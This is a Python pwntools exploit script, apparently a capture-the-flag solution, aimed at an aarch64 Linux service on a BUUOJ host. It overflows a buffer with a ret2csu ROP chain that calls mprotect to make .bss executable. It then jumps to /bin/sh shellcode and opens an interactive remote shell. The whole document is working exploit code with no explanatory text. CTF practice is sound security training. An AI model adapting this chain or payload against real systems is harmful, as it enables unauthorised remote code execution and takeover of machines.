from pwn import *

context.arch = 'aarch64'
context.os = "linux"

io = remote("node4.buuoj.cn", 28789)


mprotect_plt = 0x400600
shellcode = asm(shellcraft.aarch64.sh())

payload = p64(mprotect_plt) + shellcode
io.recvuntil("Name:")
io.sendline(payload)



csu_down = 0x4008CC
csu_up = 0x4008AC

bss = 0x411068
# save_shellcode = 0x411068 + 0x8

payload = 'a'*0x48 + p64(csu_down)
payload += p64(0xdeadbeef) + p64(csu_up)
payload += p64(0) + p64(1)  # 比较相同，不跳转
payload += p64(bss) + p64(0x7)
payload += p64(0x1000) + p64(bss+8)
payload += p64(0xdeadbeef) + p64(bss+8)  # 重新回到csu_down

io.send(payload)


io.interactive()